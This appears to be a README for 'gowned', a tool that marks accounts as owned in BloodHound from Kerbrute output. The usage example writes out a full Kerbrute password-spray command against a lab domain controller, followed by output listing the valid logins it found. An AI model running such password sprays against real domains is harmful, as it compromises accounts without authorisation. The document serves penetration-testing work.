Mark users has owned in BloodHound from various sources

# Tools

- [X] Kerbrute
- [ ] SharpSpray

# Usage

## Using Kerbrute

``` console
$ kerbrute passwordspray list_of_users.txt --dc 192.168.30.51 --domain MARVEL.local 'P@ssword321' | gowned -source 'kerbrute' -output

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 03/08/24 - Ronnie Flathers @ropnop

2024/03/08 14:37:43 >  Using KDC(s):
2024/03/08 14:37:43 >   192.168.30.51:88

2024/03/08 14:37:43 >  [+] VALID LOGIN:  aaa@MARVEL.local:P@ssword321
2024/03/08 14:37:43 >  [+] VALID LOGIN:  bbb@MARVEL.local:P@ssword321
2024/03/08 14:37:43 >  [+] VALID LOGIN:  ccc@MARVEL.local:P@ssword321
2024/03/08 14:37:43 >  [+] VALID LOGIN:  ddd@MARVEL.local:P@ssword321
2024/03/08 14:37:43 >  Done! Tested 41 logins (4 successes) in 0.280 seconds
2024/03/08 14:37:43 Added aaa@MARVEL.local as owned
2024/03/08 14:37:43 Added bbb@MARVEL.local as owned
2024/03/08 14:37:43 Added ccc@MARVEL.local as owned
2024/03/08 14:37:43 Added ddd@MARVEL.local as owned
```

Note that is also possible to `cat` a kerbrute output file, something like 

```console
$ cat temp.txt | gowned -source 'kerbrute'
```